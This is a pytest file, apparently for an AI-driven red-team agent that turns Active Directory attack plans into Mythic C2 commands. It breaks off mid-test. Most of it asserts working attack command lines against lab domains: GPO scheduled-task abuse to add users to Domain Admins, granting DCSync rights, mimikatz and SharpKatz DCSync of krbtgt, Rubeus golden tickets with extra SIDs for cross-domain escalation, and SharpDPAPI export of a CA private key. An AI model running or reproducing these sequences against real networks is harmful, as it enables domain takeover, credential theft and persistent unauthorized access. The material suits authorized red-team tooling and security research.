import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))
import capabilities  # noqa: E402
import engagement_state as es  # noqa: E402
import intent_classifier  # noqa: E402
import mythic_capability_adapter as adapter  # noqa: E402

NOW = "2026-06-10T12:00:00Z"
TTL = 600


def _foothold(forest="lab.local"):
    return es.Foothold(
        callback_id="7",
        agent="generic-agent",
        host="WS01",
        forest=forest,
        identity="LAB\\operator",
        integrity="medium",
        alive=True,
        source="test",
        timestamp=NOW,
    )


def _fact(predicate):
    return es.GraphFact(predicate=predicate, source="bloodhound:cypher", timestamp=NOW, ttl_seconds=TTL)


def _hop(effect):
    return es.Hop(
        id="seed",
        technique="seed",
        target="seed",
        effect=effect,
        status="achieved",
        evidence={"provenance": "run"},
        preconditions=[],
        satisfied_effects=[effect],
        source="test",
        timestamp=NOW,
    )


def test_adapter_translates_gpo_system_exec_plan_to_mythic_command():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]
    execution_plan = capabilities.build_capability_execution_plan(action, {"allow_proof_only": True})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["execute_assembly", "wait_for_seconds", "shell"]
    command = mythic_plan.commands[0]
    assert command.command == "execute_assembly"
    assert command.produces == ["artifact:gpo_immediate_task"]
    assert command.parameters["assembly_name"] == "SharpGPOAbuse.exe"
    args = command.parameters["assembly_arguments"]
    assert "--AddComputerTask" in args
    assert "--GPOName workstation-policy" in args
    assert mythic_plan.commands[1].consumes == ["artifact:gpo_immediate_task"]
    assert mythic_plan.commands[1].produces == ["event:group_policy_refresh"]
    assert mythic_plan.commands[2].consumes == ["artifact:gpo_immediate_task", "event:group_policy_refresh"]
    assert intent_classifier.classify_tool_call(command.command, command.parameters) == (
        "gpo-abuse",
        "workstation-policy",
    )


def test_adapter_translates_structured_artifact_read_for_direct_gpo_plan():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {"allow_proof_only": True})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["execute_assembly", "shell", "wait_for_seconds", "shell"]
    artifact_read = mythic_plan.commands[1]
    assert artifact_read.parameters == (
        r"type \\lab.local\SYSVOL\lab.local\Policies\{0A93E998-2599-4DA8-9717-6744993DED3A}"
        r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    )
    assert artifact_read.consumes == ["artifact:gpo_immediate_task"]
    assert artifact_read.produces == ["artifact:xml_validated"]


def test_merlin_adapter_prefers_native_run_net_user_for_gpo_membership_proof():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" alice /add /domain',
        "wait_seconds": 1,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    artifact_read = mythic_plan.commands[1]
    assert artifact_read.command == "run"
    assert artifact_read.parameters == {
        "executable": "more.com",
        "arguments": (
            r"\\lab.local\SYSVOL\lab.local\Policies\{0A93E998-2599-4DA8-9717-6744993DED3A}"
            r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        ),
    }
    proof = mythic_plan.commands[-1]
    assert proof.command == "run"
    assert proof.parameters == {
        "executable": "net.exe",
        "arguments": "user alice /domain",
    }


def test_merlin_adapter_can_encode_quote_bearing_gpo_membership_proof_under_run():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" alice /add /domain',
        "wait_seconds": 1,
    })
    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
    config.update({
        "gpo_membership_proof_mode": "net-group",
        "gpo_membership_proof_transport": "powershell",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)

    assert mythic_plan.ok is True
    proof = mythic_plan.commands[-1]
    assert proof.command == "run"
    assert proof.parameters["executable"] == "powershell.exe"
    encoded = proof.parameters["arguments"].rsplit(" ", 1)[1]
    assert base64.b64decode(encoded).decode("utf-16le") == 'net group "Domain Admins" /domain'


def test_adapter_preserves_bare_net_group_member_for_gpo_domain_admin_task():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" LAB\alice /add /domain',
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == [
        "execute_assembly",
        "wait_for_seconds",
        "shell",
    ]
    assert mythic_plan.commands[-1].expected_probe == "extract_gpo_domain_admin_membership_probe"
    args = mythic_plan.commands[0].parameters["assembly_arguments"]
    assert r'--Arguments "/c net group \"Domain Admins\" alice /add /domain"' in args
    assert r"LAB\alice" not in args


def test_adapter_translates_gpo_fallback_to_writer_wait_and_proof_read():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["powerpick", "wait_for_seconds", "shell"]
    writer = mythic_plan.commands[0]
    assert writer.produces == ["artifact:gpo_immediate_task"]
    assert isinstance(writer.parameters, str)
    script = writer.parameters
    assert "ScheduledTasks.xml" in script
    assert "%LocalTimeXmlEx%" not in script
    assert "AddMinutes(-1)" in script
    assert "trigger start boundary" in script
    assert "Properties.Contains" not in script
    assert "$gpoObject.Get('displayName')" in script
    assert "$gpoObject.Get('gPCMachineExtensionNames')" in script
    assert "$gpoObject.Get('versionNumber')" in script
    assert "$newVersion = $oldVersion + 1" in script
    assert "$newVersion = $oldVersion + 65536" not in script
    assert "$gpoObject.Put(" not in script
    assert "$gpoObject.SetInfo()" not in script
    assert "$gpoObject.Properties[" not in script
    assert "System.DirectoryServices.Protocols.ModifyRequest" in script
    assert "Set-GpoLdapAttributes -DistinguishedName $gpoDn" in script
    assert "$extensionMod.Name = 'gPCMachineExtensionNames'" in script
    assert "$versionMod.Name = 'versionNumber'" in script
    assert "$connection.SendRequest($request)" in script
    assert "via ${Server}:" in script
    assert "via $Server:" not in script
    assert "-notlike" not in script
    assert "IndexOf($extension, [System.StringComparison]::OrdinalIgnoreCase)" in script
    assert "[System.DirectoryServices.AuthenticationTypes]::ServerBind" in script
    assert "FindDomainController()" in script
    assert "ldap server selected: $ldapServer" in script
    assert '$gpoDn = "CN=$gpoGuid,CN=Policies,CN=System,$domainDn"' in script
    assert 'New-LdapEntry "LDAP://$ldapServer/$gpoDn"' in script
    assert '[ADSI]("LDAP://$domain' not in script
    assert "$gpoGuidInput = ''" in script
    assert "$domainDn = 'DC=lab,DC=local'" in script
    assert "$domainDn = (($domain -split" not in script
    assert "$policyRoot = \"\\\\$domain\\\\SYSVOL\\\\$domain\\\\Policies\"" in script
    assert "Resolve-GpoGuidByDirectory" in script
    assert "DirectoryServices.DirectorySearcher" in script
    assert "$searcher.Filter = \"(|(displayName=$escaped)(name=$escaped))\"" in script
    assert "GPO identity unresolved" in script
    assert "$ldapDisplayName -ieq $gpoName" in script
    assert "LDAP://$ldapServer/$gpoDn" in script
    assert "gPCMachineExtensionNames" in script
    assert "versionNumber" in script
    assert "GPT.INI" in script
    assert "scheduled task xml valid" in script
    assert "ldap version bumped" in script
    assert "gpupdate /force" not in json.dumps([command.__dict__ for command in mythic_plan.commands])
    assert mythic_plan.commands[1].parameters["seconds"] == 300
    assert mythic_plan.commands[2].parameters == r'type C:\Users\Public\sage_gpo_workstation_policy_whoami.txt'
    assert mythic_plan.commands[2].expected_probe == "extract_gpo_system_exec_probe"


def test_adapter_gpo_fallback_embeds_component_domain_dn_for_multilabel_domains():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("north.sevenkingdoms.local")],
        graph_facts=[
            _fact("generic-write:gpo:starkwallpaper"),
            _fact("gpo-domain:starkwallpaper:north.sevenkingdoms.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
        "gpo_guid": "0a93e998-2599-4da8-9717-6744993ded3a",
        "ldap_server": "winterfell.north.sevenkingdoms.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    script = mythic_plan.commands[0].parameters
    assert "$domainDn = 'DC=north,DC=sevenkingdoms,DC=local'" in script
    assert "$gpoGuidInput = '0a93e998-2599-4da8-9717-6744993ded3a'" in script
    assert '$gpoDn = "CN=$gpoGuid,CN=Policies,CN=System,$domainDn"' in script
    assert "$domainDn = (($domain -split" not in script


def test_adapter_translates_direct_rights_grant_to_mythic_command():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "principal": "LAB\\operator",
        "execution_method": "direct",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    first = mythic_plan.commands[0]
    assert first.command == "execute_assembly"
    assert first.parameters["assembly_name"] == "StandIn.exe"
    assert first.parameters["assembly_arguments"].startswith(
        "--object distinguishedname=DC=lab,DC=local --grant LAB\\operator"
    )
    assert intent_classifier.classify_tool_call(first.command, first.parameters) == (
        "dcsync-rights-grant",
        "lab.local",
    )


def test_adapter_binds_option_like_gpo_task_arguments_with_long_option_equals_form():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
    execution_plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    args = mythic_plan.commands[0].parameters["assembly_arguments"]
    assert '"--Arguments=--object distinguishedname=DC=lab,DC=local --grant LAB\\operator --type DCSync"' in args
    assert '--Arguments "--object ' not in args


def test_adapter_uses_standin_access_read_for_gpo_rights_verification():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")
    execution_plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    acl_read = mythic_plan.commands[-1]
    assert acl_read.parameters["assembly_name"] == "StandIn.exe"
    assert acl_read.parameters["assembly_arguments"] == (
        "--object distinguishedname=DC=lab,DC=local --access --ntaccount LAB\\operator"
    )


def test_adapter_translates_dcsync_plan_to_native_mythic_command():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    command = mythic_plan.commands[0]
    assert command.command == "dcsync"
    assert command.parameters == {
        "domain": "lab.local",
        "user": "krbtgt",
        "dc": "dc01.lab.local",
    }
    assert intent_classifier.classify_tool_call(command.command, command.parameters) == ("dcsync", "lab.local")


def test_merlin_adapter_translates_dcsync_plan_to_inprocess_sharpkatz_provider():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["load-assembly", "invoke-assembly"]
    setup, invoke = mythic_plan.commands
    assert setup.parameters == {"filename": "SharpKatz.exe"}
    assert setup.expected_probe == ""
    assert invoke.parameters == {
        "assembly": "SharpKatz.exe",
        "arguments": "--Command dcsync --User LAB\\krbtgt --Domain lab.local --DomainController dc01.lab.local",
    }
    assert invoke.expected_probe == "extract_dcsync_secret_probe"


def test_merlin_adapter_config_emits_north_da_forms_and_empty_config_keeps_apollo_defaults():
    north_plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="gpo-computer-task",
                parameters={
                    "tool": "SharpGPOAbuse.exe",
                    "gpo": "starkwallpaper",
                    "task_name": "SageTask",
                    "author": "NT AUTHORITY\\SYSTEM",
                    "command": "cmd.exe",
                    "arguments": '/c net group "Domain Admins" samwell.tarly /add /domain',
                    "force": True,
                },
                capability="gpo-controlled-system-exec",
                purpose="create GPO task",
                expected_probe="extract_gpo_system_exec_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="gpo-immediate-task-fallback",
                parameters={
                    "domain": "north.sevenkingdoms.local",
                    "gpo": "starkwallpaper",
                    "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
                    "task_name": "SageTask",
                    "author": "NT AUTHORITY\\SYSTEM",
                    "command": "cmd.exe",
                    "arguments": '/c net group "Domain Admins" samwell.tarly /add /domain',
                    "proof_path": r"C:\Windows\Temp\sage_gpo_proof.txt",
                    "ldap_server": "winterfell.north.sevenkingdoms.local",
                },
                capability="gpo-controlled-system-exec",
                purpose="write GPP fallback",
                expected_probe="extract_gpo_system_exec_probe",
            ),
            capabilities.CapabilityExecutionStep(
                operation="drsuapi-dcsync",
                parameters={
                    "domain": "north.sevenkingdoms.local",
                    "account": "krbtgt",
                    "dc": "winterfell.north.sevenkingdoms.local",
                },
                capability="dcsync-krbtgt",
                purpose="DCSync krbtgt",
                expected_probe="extract_dcsync_secret_probe",
            ),
        ],
        reason="north DA adapter contract",
    )

    merlin = adapter.build_mythic_capability_commands(north_plan, adapter.MERLIN_MYTHIC_ADAPTER)
    apollo = adapter.build_mythic_capability_commands(north_plan, {})

    assert merlin.ok is True
    assert [command.command for command in merlin.commands] == [
        "execute-assembly",
        "run",
        "load-assembly",
        "invoke-assembly",
    ]
    assert merlin.commands[0].parameters["filename"] == "SharpGPOAbuse.exe"
    assert "--AddComputerTask" in merlin.commands[0].parameters["arguments"]
    assert merlin.commands[1].parameters["executable"] == "powershell.exe"
    encoded = merlin.commands[1].parameters["arguments"].rsplit(" ", 1)[1]
    assert "$gpoName = 'starkwallpaper'" in base64.b64decode(encoded).decode("utf-16le")
    assert merlin.commands[2].parameters == {"filename": "SharpKatz.exe"}
    assert merlin.commands[2].expected_probe == ""
    assert merlin.commands[3].parameters == {
        "assembly": "SharpKatz.exe",
        "arguments": (
            "--Command dcsync --User NORTH\\krbtgt --Domain north.sevenkingdoms.local "
            "--DomainController winterfell.north.sevenkingdoms.local"
        ),
    }

    assert apollo.ok is True
    assert [command.command for command in apollo.commands] == ["execute_assembly", "powerpick", "dcsync"]
    assert apollo.commands[0].parameters["assembly_name"] == "SharpGPOAbuse.exe"
    assert "--AddComputerTask" in apollo.commands[0].parameters["assembly_arguments"]
    assert "$gpoName = 'starkwallpaper'" in apollo.commands[1].parameters
    assert apollo.commands[2].parameters == {
        "domain": "north.sevenkingdoms.local",
        "user": "krbtgt",
        "dc": "winterfell.north.sevenkingdoms.local",
    }

    upload_plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="adcs-ca-private-key-dpapi-export",
                parameters={
                    "target_host": "ca01",
                    "target_domain": "lab.local",
                    "local_account": "administrator",
                    "password": "CorrectHorseBatteryStaple!",
                    "callback_id": "8",
                    "proof_marker": "SAGE_CA_EXPORT_PROOF_ca01_8",
                    "tool": "SharpDPAPI.exe",
                    "tool_file_uuid": "sharpdpapi-file-uuid",
                    "staged_tool_path": r"C:\Windows\Temp\SharpDPAPI.exe",
                    "output_path": r"C:\Windows\Temp\sage_ca_dpapi_ca01_8.txt",
                    "wait_seconds": "12",
                },
                capability="adcs-ca-private-key-export",
                purpose="pin upload schema",
                expected_probe="extract_adcs_ca_private_key_probe",
            ),
        ],
        reason="upload adapter contract",
    )
    merlin_upload = adapter.build_mythic_capability_commands(upload_plan, adapter.MERLIN_MYTHIC_ADAPTER)
    apollo_upload = adapter.build_mythic_capability_commands(upload_plan, {})

    assert merlin_upload.commands[0].parameters == {
        "file": "sharpdpapi-file-uuid",
        "path": r"C:\Windows\Temp\SharpDPAPI.exe",
    }
    assert apollo_upload.commands[0].parameters == {
        "File": "sharpdpapi-file-uuid",
        "Path": r"C:\Windows\Temp\SharpDPAPI.exe",
    }


def test_adapter_can_use_mimikatz_dcsync_fallback_when_configured():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "executor": "mimikatz",
        "mimikatz_command": "mimikatz",
        "mimikatz_arguments_param": "commands",
    })

    assert mythic_plan.ok is True
    command = mythic_plan.commands[0]
    assert command.command == "mimikatz"
    assert command.parameters == {
        "commands": '"lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt /dc:dc01.lab.local"',
    }
    assert intent_classifier.classify_tool_call(command.command, command.parameters) == ("dcsync", "lab.local")


def test_merlin_adapter_preserves_explicit_mimikatz_dcsync_override():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})
    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
    config["executor"] = "mimikatz"

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["mimikatz"]
    assert mythic_plan.commands[0].parameters == {
        "spawnto": r"C:\Windows\System32\WerFault.exe",
        "arguments": '"lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt /dc:dc01.lab.local"',
    }


def test_adapter_can_disable_mimikatz_command_quoting():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
    execution_plan = capabilities.build_capability_execution_plan(action)

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "executor": "mimikatz",
        "mimikatz_command": "mimikatz",
        "mimikatz_arguments_param": "commands",
        "mimikatz_quote_command": False,
    })

    assert mythic_plan.ok is True
    assert mythic_plan.commands[0].parameters == {
        "commands": "lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt",
    }


def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequence():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local",
        preconditions=["krbtgt-hash:north.sevenkingdoms.local"],
        effects=["da:sevenkingdoms.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "north.sevenkingdoms.local",
            "target_domain": "sevenkingdoms.local",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-1192885938-529740043-2943990325",
        "aes256": "d" * 64,
        "extra_sids": ["S-1-5-21-3033212248-4076524963-940182272-519"],
        "proof_host": "kingslanding.sevenkingdoms.local",
        "child_dc": "winterfell.north.sevenkingdoms.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    # Cross-domain forge: import the child TGT into the current session, then ask Windows to acquire the parent
    # LDAP ticket before the parent DCSync proof authenticates.
    assert [command.command for command in mythic_plan.commands] == [
        "shell",
        "shell",
        "execute_assembly",
        "ticket_cache_purge",
        "ticket_cache_add",
        "ticket_cache_list",
        "shell",
        "dcsync",
    ]
    preflight_list = mythic_plan.commands[0]
    assert preflight_list.produces == ["kerberos_context_inventory"]
    assert preflight_list.consumes == []
    assert preflight_list.parameters == "klist"
    preflight_proof = mythic_plan.commands[1]
    assert preflight_proof.parameters == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
    assert preflight_proof.consumes == ["kerberos_context_inventory"]
    command = mythic_plan.commands[2]
    assert command.parameters["assembly_name"] == "Rubeus.exe"
    rendered = command.parameters["assembly_arguments"]
    assert rendered.startswith("golden /user:Administrator /domain:north.sevenkingdoms.local")
    assert "/sid:S-1-5-21-1192885938-529740043-2943990325" in rendered
    assert f"/aes256:{'d' * 64}" in rendered
    assert "/sids:S-1-5-21-3033212248-4076524963-940182272-519" in rendered
    assert "/nowrap" in rendered
    assert "/ptt" not in rendered
    assert command.produces == ["kerberos_ticket_base64"]
    assert "asktgs" not in " ".join(
        str(value)
        for item in mythic_plan.commands
        for value in (
            item.parameters.values()
            if isinstance(item.parameters, dict)
            else [item.parameters]
        )
    )
    assert mythic_plan.commands[3].parameters == {
        "all": True,
        "serviceName": "",
        "luid": "",
    }
    importer = mythic_plan.commands[4]
    assert importer.deferred is True
    assert "kerberos_ticket_base64" in importer.consumes
    assert "kerberos_logon_context" not in importer.consumes
    assert importer.parameters == {"base64ticket": "{{kerberos_ticket_base64}}"}
    assert importer.produces == ["kerberos_ticket_imported"]
    assert mythic_plan.commands[5].parameters == {
        "luid": "",
        "getSystemTickets": False,
    }
    assert mythic_plan.commands[5].consumes == ["kerberos_ticket_imported"]
    acquire = mythic_plan.commands[6]
    assert acquire.command == "shell"
    assert acquire.parameters == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
    assert acquire.produces == ["kerberos_service_ticket_acquired"]
    proof = mythic_plan.commands[7]
    assert proof.command == "dcsync"
    assert proof.parameters["domain"] == "sevenkingdoms.local"
    assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
    assert proof.parameters["dc"] == "kingslanding.sevenkingdoms.local"
    assert proof.deferred is False
    assert intent_classifier.classify_tool_call(command.command, command.parameters) == (
        "sid-history-escalation",
        "north.sevenkingdoms.local",
    )


def test_adapter_preserves_explicit_asktgs_cross_domain_fallback():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
        "child_dc": "dc01.child.root.local",
        "kerberos_ticket_acquisition_strategy": "explicit-asktgs",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands[2:5]] == [
        "execute_assembly",
        "execute_assembly",
        "execute_assembly",
    ]
    referral_args = mythic_plan.commands[3].parameters["assembly_arguments"]
    service_ticket_args = mythic_plan.commands[4].parameters["assembly_arguments"]
    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
    assert "/service:krbtgt/root.local" in referral_args
    assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
    assert "/service:ldap/dc01.root.local" in service_ticket_args


def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == [
        "run",
        "ls",
        "execute-assembly",
        "run",
        "load-assembly",
        "invoke-assembly",
        "run",
        "run",
        "load-assembly",
        "invoke-assembly",
    ]
    assert mythic_plan.commands[4].parameters == {"filename": "Rubeus.exe"}
    assert mythic_plan.commands[5].parameters == {
        "assembly": "Rubeus.exe",
        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
    }
    assert mythic_plan.commands[7].parameters == {
        "executable": "klist.exe",
        "arguments": "get ldap/dc01.root.local",
    }
    assert mythic_plan.commands[8].parameters == {"filename": "SharpKatz.exe"}
    assert mythic_plan.commands[9].parameters == {
        "assembly": "SharpKatz.exe",
        "arguments": "--Command dcsync --User ROOT\\krbtgt --Domain root.local --DomainController dc01.root.local",
    }
    rendered = " ".join(
        str(value)
        for command in mythic_plan.commands
        for value in (
            command.parameters.values()
            if isinstance(command.parameters, dict)
            else [command.parameters]
        )
    )
    assert "asktgs" not in rendered


def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_config():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
        "child_dc": "dc01.child.root.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "executor": "mimikatz",
        "mimikatz_command": "execute_pe",
    })

    proof = mythic_plan.commands[-1]
    assert proof.command == "dcsync"
    assert proof.parameters == {
        "domain": "root.local",
        "user": "ROOT\\krbtgt",
        "dc": "dc01.root.local",
    }


def test_adapter_translates_current_context_ticket_purge():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-purge",
                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
                capability="ensure-kerberos-context",
                purpose="purge stale Kerberos tickets",
                expected_probe="extract_ticket_cache_probe",
            ),
        ],
    )

    mythic_plan = adapter.build_mythic_capability_commands(plan)

    assert mythic_plan.ok is True
    assert len(mythic_plan.commands) == 1
    command = mythic_plan.commands[0]
    assert command.command == "shell"
    assert command.parameters == "klist purge"
    assert command.consumes == []
    assert command.produces == ["kerberos_current_tickets_purged"]


def test_merlin_adapter_uses_native_run_and_ls_for_current_context_proof():
    plan = capabilities.CapabilityExecutionPlan(
        True,
        steps=[
            capabilities.CapabilityExecutionStep(
                operation="kerberos-ticket-list",
                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
                capability="ensure-kerberos-context",
                purpose="inventory current Kerberos context",
                expected_probe="extract_ticket_cache_probe",
            ),
